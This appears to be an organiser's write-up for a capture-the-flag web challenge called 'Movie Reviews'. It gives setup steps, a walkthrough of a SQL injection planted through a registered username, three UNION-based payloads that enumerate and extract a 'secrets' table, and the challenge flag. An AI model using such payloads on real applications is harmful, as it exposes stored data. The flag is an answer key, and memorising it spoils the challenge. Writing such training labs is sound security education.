# Movie Reviews

Difficulty: Medium/Hard
Topics: Web

Setup:
  - Use the `docker-compose.prod.yml` to spin the containers
  - Give the players the `app/app.py` source code

Walkthrough:
 - Go through the code, notice that on the Dashboard, the code to load the user's reviews is vulnerable to SQL Injection
 - Register a new user whose username is the SQL Injection code
 - Use a UNION-based injection with 8 values (to match the existing query) to dump the database tables and find the table 'secrets'
  - ```') UNION SELECT table_name, null, null, null, null, null, null, null FROM information_schema.tables; -- -```
 - List all of the columns of the table 'secrets' to find 'secret_value'
  - ```') UNION SELECT column_name, null, null, null, null, null, null, null FROM information_schema.columns WHERE table_name = 'secrets'; -- -```
 - Extract the secret_value from the table to get the flag
  - ```') UNION SELECT secret_value, null, null, null, null, null, null, null FROM secrets; -- -```
- The flag is ```dalctf{n3v3r_g0_4g41n57_4_51c1l14n_wh3n_d34th_15_0n_7h3_l1n3_84729}```
